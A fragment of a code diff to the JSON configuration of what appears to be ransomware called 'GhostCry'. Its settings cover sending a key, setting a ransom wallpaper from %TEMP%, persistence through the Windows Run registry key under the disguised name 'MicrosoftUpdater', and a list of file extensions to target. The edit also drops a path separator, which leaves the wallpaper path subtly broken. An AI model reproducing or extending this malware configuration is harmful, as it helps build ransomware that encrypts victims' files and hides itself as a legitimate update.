@@ -10,8 +10,8 @@
 "SendKeyReg": "Sended",
   "WallpaperStatus": "SetWallpaper",
   "StartupTime": "TimeStartup",
-  "walpPath": "%TEMP%\\GhostCry.bmp",
-  "AutorunKey": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+"walpPath": "%TEMP%GhostCry.bmp",
+"AutorunKey": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
   "AutorunValue": "MicrosoftUpdater",
   "TargetExtensions": [
     ".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".tgz", ".txt",
